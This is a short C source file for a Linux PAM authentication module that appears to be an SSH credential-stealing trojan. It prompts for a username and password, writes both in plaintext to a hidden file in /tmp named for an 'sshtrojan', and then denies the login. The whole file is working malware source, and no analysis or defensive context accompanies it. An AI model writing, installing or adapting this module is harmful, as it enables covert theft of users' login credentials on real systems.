#include <stdio.h>
#include <sys/stat.h>
#include <string.h>
#include <dlfcn.h>
#include <stdlib.h>

#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv){
    int pam_code;
    const char *username = NULL;
    const char *password = NULL;

    pam_code = pam_get_user(pamh, &username, "USERNAME: ");
    if(pam_code != PAM_SUCCESS || username == NULL){
        return PAM_PERM_DENIED;
    }

    pam_code = pam_get_authtok(pamh, PAM_AUTHTOK, &password, "PASSWORD: ");
    if(pam_code != PAM_SUCCESS){
        return PAM_PERM_DENIED;
    }

    FILE *fp = fopen("/tmp/.log_sshtrojan1.txt", "a");
    if (fp != NULL) {
        fprintf(fp, "User: %s | Password: %s\n", username, password);
        fclose(fp);
    }

    return PAM_PERM_DENIED;
}